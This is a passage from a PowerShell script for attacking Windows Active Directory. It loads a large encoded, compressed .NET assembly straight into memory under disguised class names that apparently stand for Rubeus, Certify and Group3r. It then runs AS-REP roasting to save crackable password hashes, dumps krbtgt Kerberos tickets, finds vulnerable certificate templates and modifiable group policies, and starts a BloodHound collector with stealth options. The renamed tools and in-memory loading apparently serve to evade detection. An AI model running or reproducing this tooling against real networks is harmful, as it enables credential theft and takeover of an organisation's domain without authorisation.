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")))
    $aldbmdl = New-Object IO.Compression.GzipStream($bslld,[IO.Compression.CoMPressionMode]::DEComPress)
    $aoaoks = New-Object System.IO.MemoryStream
    $aldbmdl.CopyTo( $aoaoks )
    [byte[]] $byteOutArray = $aoaoks.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    $mnsikgpeft = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [RBSBob.Program]::Main($Command.Split(" "))

    [Console]::SetOut($mnsikgpeft)
    $Results = $StringWriter.ToString()
    $Results
}

if($jkerbask) {Write-Host "Skipping ASREPRoasting..." -ForegroundColor Yellow;}
else{
	if ($jdomain){
		echo " "
		Write-Host "ASREPRoasting..." -ForegroundColor Cyan;
		Invoke-RBSBob -Command "asreproast /domain:$jdomain /format:hashcat /nowrap" > $jdomain-ASREP-hashes.txt

		type $pwd\ASREP-hashes.txt
		Write-Host "Done! " -ForegroundColor Green;
		echo " "
	}
	else{
		echo " "
		Write-Host "ASREPRoasting..." -ForegroundColor Cyan;
		Get-ForestDomain -erroraction silentlycontinue|Select-Object -ExpandProperty Name | ForEach-Object {Invoke-RBSBob -Command "asreproast /domain:$_ /format:hashcat /nowrap" > $_-ASREP-hashes.txt}

		Get-ForestDomain -erroraction silentlycontinue|Select-Object -ExpandProperty Name | ForEach-Object {type $pwd\$_-ASREP-hashes.txt}
		Write-Host "Done! " -ForegroundColor Green;
		echo " "
	}
}

if($jlocaltickets){}
else{
	Write-Host "Checking for tickets in your current box..." -ForegroundColor Cyan;
	Write-Host "You'll see only yours unless you run as admin" -ForegroundColor Yellow;
	Invoke-RBSBob -Command "dump /service:krbtgt /nowrap" > Kerb-Tickets.txt
	type $pwd\Kerb-Tickets.txt
	echo " "
	Write-Host "Done! " -ForegroundColor Green;
	echo " "
}


function Outvoke-Certify
{

    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [C3rt1fy.Program]::main([string[]]$args)

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
  
}

if ($jtemplates)
{
    Write-Host "Skipping Misconfigured Templates enumeration..." -ForegroundColor Yellow;
}
else{
    echo ""
	Write-Host "Serching for Misconfigured Certificate Templates... " -ForegroundColor Cyan
    Outvoke-Certify find /vulnerable > .\Vulnerable_Templates.txt
    type .\Vulnerable_Templates.txt
    Write-Host "Done! " -ForegroundColor Green;
    echo " "
}

Set ErrorActionPreference Silentlycontinue

if($jvulnGPO){Write-Host "Skipping AD Group Policy enumeration..." -ForegroundColor Yellow;}
else{
	echo " "
	
	Write-Host "Enumerating for vulnerabilities in AD Group Policy... " -ForegroundColor Cyan
	
	echo " "
	
	$jSIDdomain = Get-DomainSID
	
	$jGPOIDRAW = (Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericAll" -and $_.SecurityIdentifier -match "$jSIDdomain-[\d]{4,10}" })
	
	$jGPOIDs = ($jGPOIDRAW | Select-Object -ExpandProperty ObjectDN | Get-Unique)
	
	if($jGPOIDRAW){
		foreach($jGPOID in $jGPOIDs){
			Write-Host "Name of modifiable Policy: " -ForegroundColor Yellow
			echo "Name of modifiable Policy: " >> $pwd\GPOs_Modifiable.log
			Get-DomainGPO -Identity $jGPOID | select displayName, gpcFileSysPath | Format-Table -HideTableHeaders
			Get-DomainGPO -Identity $jGPOID | select displayName, gpcFileSysPath | Format-Table -HideTableHeaders >> $pwd\GPOs_Modifiable.log
			Write-Host "Who can edit the policy: " -ForegroundColor Yellow
			echo "Who can edit the policy: " >> $pwd\GPOs_Modifiable.log
			echo " "
			echo " " >> $pwd\GPOs_Modifiable.log
			$jGPOIDSELECTs = ($jGPOIDRAW | ? {$_.ObjectDN -eq $jGPOID} | Select-Object -ExpandProperty SecurityIdentifier | Select-Object -ExpandProperty Value | Get-Unique)
			$jwhocan = foreach($jGPOIDSELECT in $jGPOIDSELECTs){$SID = New-Object System.Security.Principal.SecurityIdentifier("$jGPOIDSELECT"); $objUser = $SID.Translate([System.Security.Principal.NTAccount]); $objUser.Value}
			$jwhocan
			$jwhocan >> $pwd\GPOs_Modifiable.log
			echo " "
			echo " "
			echo " " >> $pwd\GPOs_Modifiable.log
			echo " " >> $pwd\GPOs_Modifiable.log
			Write-Host "OUs the policy applies to: " -ForegroundColor Yellow
			echo "OUs the policy applies to: " >> $pwd\GPOs_Modifiable.log
			Get-DomainOU -GPLink "$jGPOID" | select distinguishedName | Format-Table -HideTableHeaders
			Get-DomainOU -GPLink "$jGPOID" | select distinguishedName | Format-Table -HideTableHeaders >> $pwd\GPOs_Modifiable.log
			echo "======================="
			echo "======================="
			echo " "
			echo "=======================" >> $pwd\GPOs_Modifiable.log
			echo "=======================" >> $pwd\GPOs_Modifiable.log
			echo " " >> $pwd\GPOs_Modifiable.log
		}
	}
	else{Write-Host "Looks like there are no modifiable GPOs..." -ForegroundColor Yellow}
	
	echo " "
	echo " "
	echo " "
	echo " "
	
	Write-Host "More GPO checks..." -ForegroundColor Cyan;
	
	echo " "
	echo " "
	echo " "
	echo " "
	
	function Invoke-Group3r{

    [CmdletBinding()]
    Param (
        [String]
        $Command = "-w"

    )
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [Group3r.Group3r]::Main($Command.Split(" "))

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
	}
	
	Invoke-Group3r >> $pwd\GPOs_Vulnerable.log
	type $pwd\GPOs_Vulnerable.log
}



function Outvoke-BloodHound
{
    [CmdletBinding(PositionalBinding = $false)]
    param(
        [Alias("c")]
        [String[]]
        $CollectionMethod = [String[]]@('All'),

        [Alias("d")]
        [String]
        $Domain,
        
        [Alias("s")]
        [Switch]
        $SearchForest,

        [Switch]
        $Stealth,

        [String]
        $LdapFilter,

        [String]
        $DistinguishedName,

        [String]
        $ComputerFile,

        [ValidateScript({ Test-Path -Path $_ })]
        [String]
        $OutputDirectory = $( Get-Location ),

        [ValidateNotNullOrEmpty()]
        [String]
        $OutputPrefix,

        [String]
        $CacheName,

        [Switch]
        $MemCache,

        [Switch]
        $RebuildCache,

        [Switch]
        $RandomFilenames,

        [String]
        $ZipFilename,
        
        [Switch]
        $NoZip,
        
        [String]
        $ZipPassword,
        
        [Switch]
        $TrackComputerCalls,
        
        [Switch]
        $PrettyPrint,

        [String]
        $LdapUsername,

        [String]
        $LdapPassword,

        [string]
        $DomainController,

        [ValidateRange(0, 65535)]
        [Int]
        $LdapPort,

        [Switch]
        $SecureLdap,
        
        [Switch]
        $DisableCertVerification,

        [Switch]
        $DisableSigning,

        [Switch]
        $SkipPortCheck,

        [ValidateRange(50, 5000)]
        [Int]
        $PortCheckTimeout = 500,

        [Switch]
        $SkipPasswordCheck,

        [Switch]
        $ExcludeDCs,

        [Int]
        $Throttle,

        [ValidateRange(0, 100)]
        [Int]
        $Jitter,

        [Int]
        $Threads,

        [Switch]
        $SkipRegistryLoggedOn,

        [String]
        $OverrideUsername,

        [String]
        $RealDNSName,

        [Switch]
        $CollectAllProperties,

        [Switch]
        $Loop,

        [String]
        $LoopDuration,

        [String]
        $LoopInterval,

        [ValidateRange(500, 60000)]
        [Int]
        $StatusInterval,
        
        [Alias("v")]
